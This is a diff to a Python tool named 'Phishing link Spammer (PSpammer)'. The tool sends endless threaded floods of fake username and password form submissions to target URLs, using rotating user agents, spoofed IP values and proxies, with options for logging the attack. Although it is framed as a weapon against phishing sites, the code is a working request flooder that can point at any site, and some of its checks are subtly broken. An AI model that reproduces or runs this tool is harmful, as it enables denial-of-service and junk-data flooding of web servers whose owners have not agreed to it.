@@ -157,8 +157,14 @@ def main():
 		useragents = json.load(fu)
 	with open("sources/raw_userdata.json", "r") as fr:
 		raw_userdatas = json.load(fr)
-	with open(".logs", "a") as fl:
-		logfile = fl
+	logwriter = open("logs.txt", "a")
+
+	# Check if "target.json" first set is empty or not modified from the given example
+	def check_set():
+		tar = targets["attributes"][0]
+		if tar["id"] is ["", " ", "1"] and tar["request_url"] is ["", " ", "http://192.168.1.1/login.shtml?id=401"]:
+			pass
+			# exit('Please modify "target.json" file to use this tool (The given data over there is an example!)')
 
 	# Count all inputted targets on "target.json"
 	def count_attributes():
@@ -171,7 +177,7 @@ def main():
 		interface_1 = input(f'\n\n"{loopback}" targeted sites are found in "target.json". Please check your inputted data to minimize errors.\n ~ Continue? [Y/N] ')
 		if not interface_1 in ["Y", "y"]:
 			exit("Thank you for choosing PSpammer!")
-		interface_2 = input('What type of posts spam log you want to use?\n [01] In-Terminal-Logging Only (Best for long attacks - Recommended)\n [02] On-File-Logging (Best for quick diagnostic attack - Not Recommended)\n [03] Both (Use this if you like option 1 and 2 at the same time)\n [04] None (Only Shows Status Codes And Text - Recommended)\n ~ Answer: ')
+		interface_2 = int(input('What type of posts spam log you want to use?\n [01] In-Terminal-Logging Only (Best for long attacks - Recommended)\n [02] On-File-Logging (Best for quick diagnostic attack - Not Recommended)\n [03] Both (Use this if you like option 1 and 2 at the same time)\n [04] None (Only Shows Status Codes And Text - Recommended)\n ~ Answer: '))
 		if interface_2 == 1:
 			logtype = logtype + 1
 		elif interface_2 == 2:
@@ -181,18 +187,19 @@ def main():
 		else:
 			logtype = logtype + 4
 
-	def loghandler(status, text, id, proxy, payload1, payload2):
+	def loghandler(status, text, id_na, proxy, payload1, payload2):
+		template1 = f'Status Code: {status} | Target: {id_na} | Text: {text} | Proxy: {proxy} | Header: {payload1} | Form | {payload2}'
+		template2 = f'Status Code: {status} | Target: {id_na} | Text: {text}'
 		if logtype == 1:
-			print(f'Status Code: {status} | Target: {id} | Text: {text} | Proxy: {proxy} | Header: {payload1} | Form | {payload2}')
+			print(template1)
 		elif logtype == 2:
-			print(f'Status Code: {status} | Target: {id} | Text: {text}')
-			logfile.write(status + text)
+			print(template2)
+			logwriter.write(template1)
 		elif logtype == 3:
-			print(f'Status Code: {status} | Target: {id} | Text: {text} | Proxy: {proxy} | Header: {payload1} | Form | {payload2}')
-			logfile.write(status + text)
+			print(template1)
+			logwriter.write(template1)
 		else:
-			print(f'Status Code: {status} | Target: {id} | Text: {text}')
-			print(status)
+			print(template2)
 
 	# Parsing up some necessary data that doesn't require to be randomized and store it in memory to improve performance
 	userdata = raw_userdatas["attributes"][0]
@@ -214,7 +221,7 @@ def main():
 		for loop in range(0, int(loopback)):
 			# Loops for every target that the user has encoded in "target.json" and read its form names
 			id = targets["attributes"][loop]["id"]
-			post_link = targets["attributes"][loop]["post_link"]
+			request_url = targets["attributes"][loop]["request_url"]
 			header = targets["attributes"][loop]["headers"]
 
 			form = targets["attributes"][loop]["forms"]
@@ -273,34 +280,38 @@ def main():
 			else:
 				main_form = {input_username:chosen_variant_username, input_password:chosen_variant_password, input_ip:gen_proxy}
 
-			def Sender():
-				while True:
-					try:
-						Spammer = requests.get(url=post_link, timeout=timeout, data=main_form, headers=main_header, proxies=proxy, cert=cert_conv)
-						print("[Console] Status: Request Sent")
-						loghandler(status=Spammer.status_code, text="Request Posted", id=id, proxy=gen_proxy, payload1=main_header, payload2=main_form)
-					except requests.ReadTimeout:
-						loghandler(status="Unknown", text="Request Blocked", id=id, proxy=gen_proxy, payload1=main_header, payload2=main_form)
-						continue
-					except (requests.ConnectTimeout, requests.ConnectionError):
-						loghandler(status="Unknown", text="Sent Failed -> Possible Cause: No Internet/Request Block", id=id, proxy=gen_proxy, payload1=main_header, payload2=main_form)
-						continue
-					except requests.RequestException:
-						print("[Error] Invalid Url!!! Stopping Process...")
-						exit("\n\n Code:Invurl")
+			while True:
+				def Sender():
+					while True:
+						try:
+							Spammer = requests.get(url=request_url, timeout=timeout, data=main_form, headers=main_header, proxies=proxy, cert=cert_conv)
+							print("[Console] Status: Request Sent")
+							loghandler(status=Spammer.status_code, text="Request Posted", id_na=id, proxy=gen_proxy, payload1=main_header, payload2=main_form)
+						except requests.ReadTimeout:
+							loghandler(status="Unknown", text="Request Blocked", id_na=id, proxy=gen_proxy, payload1=main_header, payload2=main_form)
+							continue
+						except (requests.ConnectTimeout, requests.ConnectionError):
+							loghandler(status="Unknown", text="Sent Failed -> Possible Cause: No Internet/Request Block", id_na=id, proxy=gen_proxy, payload1=main_header, payload2=main_form)
+							continue
+						except requests.RequestException:
+							print("[Error] Invalid Url!!! Stopping Process...")
+							exit("\n\n Code:Invurl")
+						except KeyboardInterrupt:
+							exit('Thank you for choosing PSpammer!')
 
-			def Threader():
-				threads = []
-				for i in range(threading_value):
-					t = threading.Thread(target=Sender)
-					t.daemon = True
-					threads.append(t)
-				for i in range(threading_value):
-					threads[i].start()
-				for i in range(threading_value):
-					threads[i].join()
+				def Threader():
+					threads = []
+					for i in range(threading_value):
+						t = threading.Thread(target=Sender)
+						t.daemon = True
+						threads.append(t)
+					for i in range(threading_value):
+						threads[i].start()
+					for i in range(threading_value):
+						threads[i].join()
 
-			Threader()
+				Threader()
+	check_set()
 	count_attributes()
 	prompt()
 	attack()
@@ -308,11 +319,8 @@ def main():
 
 # Initiator
 if __name__ == "__main__":
-	try:
-		clean_af()
-		print("Phishing link Spammer (PSpammer) version 3 (Beta) || DO NOT DISTRIBUTE WITHOUT PERMISSION")
-		"If you are planning to add a flask here to be available 24/7 on replit, Please add bellow this line for it to work."
+	clean_af()
+	print("Phishing link Spammer (PSpammer) version 3 (Beta) || DO NOT DISTRIBUTE WITHOUT PERMISSION")
+	"If you are planning to add a flask here to be available 24/7 on replit, Please add bellow this line for it to work."
 
-		main()
-	except KeyboardInterrupt:
-		exit("\n\nThank you for choosing PSpammer!")
+	main()
